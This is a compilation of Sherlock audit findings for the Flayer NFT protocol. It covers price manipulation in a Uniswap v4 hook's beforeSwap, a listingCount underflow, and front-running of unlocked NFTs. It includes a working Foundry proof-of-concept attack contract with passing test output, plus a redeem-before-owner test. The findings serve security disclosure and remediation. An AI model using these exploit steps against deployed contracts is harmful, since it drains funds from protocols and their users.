# H-17 - UniswapImplementation.before Swap() is vulnerable to price manipulation attack

**Severity:** high
**Auditor:** Sherlock
**Protocol:** Flayer
**Keywords:** Uniswap, price manipulation, beforeSwap, vulnerability, attack, TWAP, collectionToken, WETH, swap, market price, flash loan, profit, fee, protocol, liquidity, manipulation, delta accounting, risk-free profit, attack steps

---

# Issue H-17: UniswapImplementation.before Swap() is vulnerable to price manipulation attack

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/559)  
The protocol has acknowledged this issue.  
Found by: AuditorPraise, BugPull, ComposableSecurity, KingNFT, Thanos, zzykxx


In \u0060UniswapImplementation.beforeSwap()\u0060, when there is undistributed fee of collectionToken and users try to swap WETH -> collectionToken, these pending fee of collectionToken will be firstly swapped. The issue is that the swap here is based on current price rather than a TWAP, this will make price manipulation attack available.


The issue arises on \u0060UniswapImplementation.sol:508\u0060 (link), current market price is fetched, and used for calculating swap token amount on L521 and L536. Per Uniswap V4\u0027s delta accounting system, the market price can be easily manipulated even without flash loan. Therefore, attackers can do the following steps in one execution to drain risk-free profit from \u0060UniswapImplementation\u0060: 
1. Sell some collectionTokens to decrease price
2. Swap with pool fee of collectionToken at a discount price
3. Buy exact collectionTokens of step 1 to increase price back

## File

\u0060\u0060\u0060solidity
src\contracts\implementation\UniswapImplementation.sol
490:     function beforeSwap(address sender, PoolKey calldata key,
             IPoolManager.SwapParams memory params, bytes calldata hookData) public override
             onlyByPoolManager returns (bytes4 selector_, BeforeSwapDelta beforeSwapDelta_,
             uint24 swapFee_) {
            ...
502:          if (trigger && pendingPoolFees.amount1 != 0) {
            ...
508:              (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolId); // @audit current price
            ...
513:              if (params.amountSpecified >= 0) {
            ...
520:                  (, ethIn, tokenOut, ) = SwapMath.computeSwapStep({
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
sqrtPriceCurrentX96: sqrtPriceX96,
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
});
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
else {
    (, ethIn, tokenOut, ) = SwapMath.computeSwapStep({
        sqrtPriceCurrentX96: sqrtPriceX96,
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
});
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
}
\u0060\u0060\u0060

The Uniswap Implementation has collected some fee of collection Token

N/A

(1) Sell some collection Tokens to decrease price (2) Swap with pool fee of collection Token at a discount price (3) Buy exact collection Tokens of step 1 to increase price back

Attackers can drain risk-free profit from the protocol.

The following PoC shows a case that: (1) In the normal case, Alice swap 1 ether collection Token at a cost of 1.11 ether of WETH (2) In the attack case, Alice swap 1 ether collection Token at only cost of 0.41 ether of WETH

\u0060\u0060\u0060solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import {Ownable} from \u0027@solady/auth/Ownable.sol\u0027;
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
import {PoolSwapTest} from \u0027@uniswap/v4-core/src/test/PoolSwapTest.sol\u0027;
import {Hooks, IHooks} from \u0027@uniswap/v4-core/src/libraries/Hooks.sol\u0027;
import {IUnlockCallback} from \u0027@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol\u0027;
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {CurrencySettler} from "@uniswap/v4-core/test/utils/CurrencySettler.sol";
import {IERC20} from \u0027@openzeppelin/contracts/token/ERC20/IERC20.sol\u0027;
import {IERC721} from \u0027@openzeppelin/contracts/token/ERC721/IERC721.sol\u0027;
import {CollectionToken} from \u0027@flayer/CollectionToken.sol\u0027;
import {Locker, ILocker} from \u0027@flayer/Locker.sol\u0027;
import {LockerManager} from \u0027@flayer/LockerManager.sol\u0027;
import {IBaseImplementation} from \u0027@flayer-interfaces/IBaseImplementation.sol\u0027;
import {ICollectionToken} from \u0027@flayer-interfaces/ICollectionToken.sol\u0027;
import {IListings} from \u0027@flayer-interfaces/IListings.sol\u0027;
import {Currency, CurrencyLibrary} from \u0027@uniswap/v4-core/src/types/Currency.sol\u0027;
import {LPFeeLibrary} from \u0027@uniswap/v4-core/src/libraries/LPFeeLibrary.sol\u0027;
import {PoolKey} from \u0027@uniswap/v4-core/src/types/PoolKey.sol\u0027;
import {PoolIdLibrary, PoolId} from \u0027@uniswap/v4-core/src/types/PoolId.sol\u0027;
import {IPoolManager, PoolManager, Pool} from \u0027@uniswap/v4-core/src/PoolManager.sol\u0027;
import {TickMath} from \u0027@uniswap/v4-core/src/libraries/TickMath.sol\u0027;
import {Deployers} from \u0027@uniswap/v4-core/test/utils/Deployers.sol\u0027;
import {FlayerTest} from \u0027./lib/FlayerTest.sol\u0027;
import {ERC721Mock} from \u0027./mocks/ERC721Mock.sol\u0027;
import {BaseImplementation, IBaseImplementation} from \u0027@flayer/implementation/BaseImplementation.sol\u0027;
import {UniswapImplementation} from "@flayer/implementation/UniswapImplementation.sol";
import {console2} from \u0027forge-std/console2.sol\u0027;

contract AttackHelper is IUnlockCallback {
    using StateLibrary for IPoolManager;
    using TransientStateLibrary for IPoolManager;
    using CurrencySettler for Currency;
    IPoolManager public immutable manager;
    PoolKey public poolKey;
    struct CallbackData {
        address sender;
        IPoolManager.SwapParams params;
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
constructor(IPoolManager _manager, PoolKey memory _poolKey) {
    manager = _manager;
    poolKey = _poolKey;
}
function swap(
    IPoolManager.SwapParams memory params
) external {
    manager.unlock(abi.encode(CallbackData(msg.sender, params)));
}
function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
    CallbackData memory data = abi.decode(rawData, (CallbackData));
    // 1. Sell some collectionTokens to decrease price
    IPoolManager.SwapParams memory sellParam = IPoolManager.SwapParams({
        zeroForOne: false, // unflippedToken -> WETH
        amountSpecified: -10 ether, // exact input
        sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
    });
    manager.swap(poolKey, sellParam, "");
    // 2. Swap with pool fee at a discount price
    manager.swap(poolKey, data.params, "");
    // 3. Buy exact collectionTokens of step1 to increase price back
    IPoolManager.SwapParams memory buyParam = IPoolManager.SwapParams({
        zeroForOne: true, // WETH -> unflippedToken
        amountSpecified: 10 ether, // exact input
        sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
    });
    manager.swap(poolKey, buyParam, "");
    int256 delta0 = manager.currencyDelta(address(this), poolKey.currency0);
    int256 delta1 = manager.currencyDelta(address(this), poolKey.currency1);
    if (delta0 < 0) {
        poolKey.currency0.settle(manager, data.sender, uint256(-delta0), false);
    }
    if (delta1 < 0) {
        poolKey.currency1.settle(manager, data.sender, uint256(-delta1), false);
    }
    if (delta0 > 0) {
        poolKey.currency0.take(manager, data.sender, uint256(delta0), false);
    }
    if (delta1 > 0) {
        poolKey.currency1.take(manager, data.sender, uint256(delta1), false);
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
        }
        return abi.encode("");
        }
      }
      contract BeforeSwapPriceManupilationAttackTest is Deployers, FlayerTest {
        using LPFeeLibrary for uint24;
        using PoolIdLibrary for PoolKey;
        using StateLibrary for PoolManager;
        address internal constant BENEFICIARY = address(123);
        uint160 constant SQRT_PRICE_1 = 2**96; // 1 ETH per collectionToken
        ERC721Mock unflippedErc721;
        CollectionToken unflippedToken;
        PoolKey poolKey;
        AttackHelper attackHelper;
        constructor() {
           _deployPlatform();
        }
        function setUp() public {
           _createCollection();
           _initCollection();
           _addSomeFee();
           attackHelper = new AttackHelper(poolManager, poolKey);
        }
        function testNormalCase() public {
           address alice = users[0];
           _dealNativeToken(alice, 10 ether);
           _approveNativeToken(alice, address(poolSwap), type(uint).max);
           uint wethBefore = WETH.balanceOf(alice);
           assertEq(10 ether, wethBefore);
           uint unflippedTokenBefore = unflippedToken.balanceOf(alice);
           assertEq(0, unflippedTokenBefore);
           vm.startPrank(alice);
           poolSwap.swap(
             poolKey,
             IPoolManager.SwapParams({
               zeroForOne: true, // WETH -> unflippedToken
               amountSpecified: 1 ether, // exact output
               sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
             }),
             PoolSwapTest.TestSettings({
               takeClaims: false,
               settleUsingBurn: false
             }),
\u0060\u0060\u0060
\u0060\u0060\u0060
                   vm.stopPrank();
                   (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolKey.toId());
                   // swap with fee, liquidity pool not been touched
                   assertEq(SQRT_PRICE_1, sqrtPriceX96);
                   // swap 1 ether collectionToken with 1.11 ether WETH
                   uint wethAfter = WETH.balanceOf(alice);
                   uint unflippedTokenAfter = unflippedToken.balanceOf(alice);
                   uint wethCost = wethBefore - wethAfter;
                   assertApproxEqAbs(1.11 ether, wethCost, 0.01 ether);
                   uint unflippedTokenReceived = unflippedTokenAfter - unflippedTokenBefore;
                   assertEq(1 ether, unflippedTokenReceived);
               }
               function testAttackCase() public {
                   address alice = users[0];
                   _dealNativeToken(alice, 10 ether);
                   _approveNativeToken(alice, address(attackHelper), type(uint).max);
                   uint wethBefore = WETH.balanceOf(alice);
                   assertEq(10 ether, wethBefore);
                   uint unflippedTokenBefore = unflippedToken.balanceOf(alice);
                   assertEq(0, unflippedTokenBefore);
                   vm.startPrank(alice);
                   attackHelper.swap(
                       IPoolManager.SwapParams({
                           zeroForOne: true, // WETH -> unflippedToken
                           amountSpecified: 1 ether, // exact output
                           sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
                       })
                   );
                   vm.stopPrank();
                   // swap 1 ether collectionToken with 0.41 ether WETH
                   uint wethAfter = WETH.balanceOf(alice);
                   uint unflippedTokenAfter = unflippedToken.balanceOf(alice);
                   uint wethCost = wethBefore - wethAfter;
                   assertApproxEqAbs(0.41 ether, wethCost, 0.01 ether);
                   uint unflippedTokenReceived = unflippedTokenAfter - unflippedTokenBefore;
                   assertEq(1 ether, unflippedTokenReceived);
               }
               function _createCollection() internal {
                   while (address(unflippedToken) == address(0)) {
                       unflippedErc721 = new ERC721Mock();
                       address test = locker.createCollection(address(unflippedErc721),
\u0060\u0060\u0060
if (Currency.wrap(test) >= Currency.wrap(address(WETH))) {
    unflippedToken = CollectionToken(test);
}
}
assertTrue(Currency.wrap(address(unflippedToken)) >= Currency.wrap(address(WETH)), \u0027Invalid unflipped token\u0027);
}
function _initCollection() internal {
    // This needs to avoid collision with other tests
    uint tokenOffset = uint(type(uint128).max) + 1;
    // Mint enough tokens to initialize successfully
    uint tokenIdsLength = locker.MINIMUM_TOKEN_IDS();
    uint[] memory _tokenIds = new uint[](tokenIdsLength);
    for (uint i; i < tokenIdsLength; ++i) {
        _tokenIds[i] = tokenOffset + i;
        unflippedErc721.mint(address(this), tokenOffset + i);
    }
    // Approve our {Locker} to transfer the tokens
    unflippedErc721.setApprovalForAll(address(locker), true);
    // Initialize the specified collection with the newly minted tokens. To allow for varied
    // denominations we go a little nuts with the ETH allocation.
    assertTrue(tokenIdsLength == 10);
    uint startBalance = WETH.balanceOf(address(this));
    _dealNativeToken(address(this), 10 ether);
    _approveNativeToken(address(this), address(locker), type(uint).max);
    locker.initializeCollection(address(unflippedErc721), 10 ether, _tokenIds,
    _tokenIds.length * 1 ether, SQRT_PRICE_1);
    _dealNativeToken(address(this), startBalance);
    // storing poolKey
    poolKey = PoolKey({
        currency0: Currency.wrap(address(WETH)),
        currency1: Currency.wrap(address(unflippedToken)),
        fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
        tickSpacing: 60,
        hooks: IHooks(address(uniswapImplementation))
    });
    (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolKey.toId());
    assertEq(SQRT_PRICE_1, sqrtPriceX96);
}
function _addSomeFee() internal {
    vm.prank(address(locker));
    unflippedToken.mint(address(this), 1 ether);
}
\u0060\u0060\u0060solidity
unflippedToken.approve(address(uniswapImplementation), type(uint).max);
uniswapImplementation.depositFees(address(unflippedErc721), 0, 1 ether);
IBaseImplementation.ClaimableFees memory fees =
    uniswapImplementation.poolFees(address(unflippedErc721));
assertEq(0, fees.amount0);
assertEq(1 ether, fees.amount1);
\u0060\u0060\u0060

And the test log:
\u0060\u0060\u0060
2024-08-flayer\flayer> forge test --match-contract
    BeforeSwapPriceManupilationAttackTest -vv
[￿] Compiling...
[￿] Compiling 1 files with Solc 0.8.26
Solc 0.8.26 finished in 15.82s
Compiler run successful!
Ran 2 tests for test/BugBeforeSwapPriceManupilationAttack.t.sol:BeforeSwapPriceManupilationAttackTest
[PASS] testAttackCase() (gas: 364330)
[PASS] testNormalCase() (gas: 283375)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.56ms (3.04ms CPU time)
Ran 1 test suite in 29.01ms (7.56ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
\u0060\u0060\u0060

Using TWAP, reference: https://blog.uniswap.org/uniswap-v4-truncated-oracle-hook.  
Or swap collection Token to WETH immediately at fee receiving time.
## Issue H-18: When relisting a floor item listing, listingCount is not increased, causing listingCount can be underflowed.

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/574)  
Found by: araj, g, utsav, zraxx  

[Code Reference](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L625-L672)  
The relist function is used to refill the parameters of any token listings, including floor item listing. For a floor item listing, users can change its owner from address(0) to their own address without paying any fees, and set its type to DUTCH or LIQUID. However, this operation does not change listingCount. So, when all the listings are filled, the listingCount will be underflowed to a large number (close to uint256.max) instead of 0. Later, in the function CollectionShutdown.sol#execute, it will be reverted as listings.listingCount(_collection) != 0.  

In Listings.sol#relist, when relisting for a floor item listing, listingCount is not increased, causing listingCount can be underflowed.  

1. The _collection is initialized.  
2. There are floor item listings in the _collection.  

No response  

1. The attacker calls relist for a floor item listing.
The attacker immediately calls cancelListings to cancel it, in order to refund the tax. At the same time, listingCount is decreased. As a result, the listingCount cannot correctly reflect the number of listings contained in collection.

listingCount cannot correctly reflect the number of listings contained in collection. CollectionShutdown.sol#execute will be DOSed.

No response

Avoid relisting floor item listings OR Increase listingCount by one.
## Issue H-19: Owner Can Lose The Token After Being Unlocked but Not Withdrawn

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/601)

Found by:  
0x37, 0xAlix2, BADROBINX, Greese, Ironsidesec, adamn, almantare, araj, cnsdkc007, dany.armstrong90, h2134, merlinboii, t.aksoy, utsav, zarkk01, zzykxx


The \u0060unlockProtectedListing\u0060 function allows a user to unlock an NFT and make it withdrawable for themselves. However, if the user does not immediately withdraw the NFT, another user can front-run the process by swapping, redeeming, or buying the NFT, as there is no protection mechanism preventing this. The \u0060Locker::isListing\u0060 function fails to correctly identify the unlocked NFT as being in a protected state, allowing it to be redeemed.


When the \u0060unlockProtectedListing\u0060 function is called, the NFT owner can either withdraw the NFT or leave it in the contract for later withdrawal. However, if the NFT is not withdrawn immediately, a malicious user can swap, redeem, or buy the unlocked NFT. Inside the \u0060unlockProtectedListing\u0060 function, if the owner opts not to withdraw the NFT, the listing owner is set to zero and the NFT becomes withdrawable later by the rightful owner.

\u0060\u0060\u0060solidity
// Delete the listing objects
delete _protectedListings[_collection][_tokenId];
// Transfer the listing ERC721 back to the user
if (_withdraw) {
   locker.withdrawToken(_collection, _tokenId, msg.sender);
   emit ListingAssetWithdraw(_collection, _tokenId);
} else {
   canWithdrawAsset[_collection][_tokenId] = msg.sender;
}
\u0060\u0060\u0060

However, due to this owner field being set to zero, the \u0060Locker::isListing\u0060 function incorrectly interprets the NFT as no longer being protected, allowing other users to redeem or buy the unlocked NFT before the rightful owner can withdraw it.
\u0060\u0060\u0060solidity
function isListing(address _collection, uint _tokenId) public view returns (bool) {
    IListings _listings = listings;
    // Check if we have a liquid or dutch listing
    if (_listings.listings(_collection, _tokenId).owner != address(0)) {
        return true;
    }
    // Check if we have a protected listing
    if (_listings.protectedListings().listings(_collection, _tokenId).owner != address(0)) {
        return true;
    }
    return false;
}

Test:
function test_redeemBeforeOner(uint _tokenId, uint96 _tokensTaken) public {
    _assumeValidTokenId(_tokenId);
    vm.assume(_tokensTaken >= 0.1 ether);
    vm.assume(_tokensTaken <= 1 ether - protectedListings.KEEPER_REWARD());
    // Set the owner to one of our test users (Alice)
    address payable _owner = users[0];
    // Mint our token to the _owner and approve the {Listings} contract to use it
    erc721a.mint(_owner, _tokenId);
    // Create our listing
    vm.startPrank(_owner);
    erc721a.approve(address(protectedListings), _tokenId);
    _createProtectedListing({
        _listing: IProtectedListings.CreateListing({
            collection: address(erc721a),
            tokenIds: _tokenIdToArray(_tokenId),
            listing: IProtectedListings.ProtectedListing({
                owner: _owner,
                tokenTaken: _tokensTaken,
                checkpoint: 0
            })
        })
    });
    // Approve the ERC20 token to be used by the listings contract to unlock the listings
    locker.collectionToken(address(erc721a)).approve(
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
address(protectedListings),
_tokensTaken
);
protectedListings.unlockProtectedListing(
address(erc721a),
_tokenId,
false
);
vm.stopPrank();
// Approve the ERC20 token to be used by the listings contract to unlock the
// listings
locker.collectionToken(address(erc721a)).approve(
address(locker),
1000000000000 ether
);
//@audit another user can redeem before owner.
uint[] memory redeemTokenIds = new uint[](1);
redeemTokenIds[0] = _tokenId;
locker.redeem(address(erc721a), redeemTokenIds);
vm.prank(_owner);
// Owner cant withdraw anymore since they have been redeemed
protectedListings.withdrawProtectedListing(address(erc721a), _tokenId);
\u0060\u0060\u0060

original owner might lose the NFT to a malicious actor who front-runs the withdrawal process

- [ProtectedListings.sol](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L314)
- [Locker.sol](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/Locker.sol#L438)

Manual Review

Modify isListing function: Ensure that tokens marked as canWithdrawAsset are still considered active listings until they are fully withdrawn by their rightful owner.
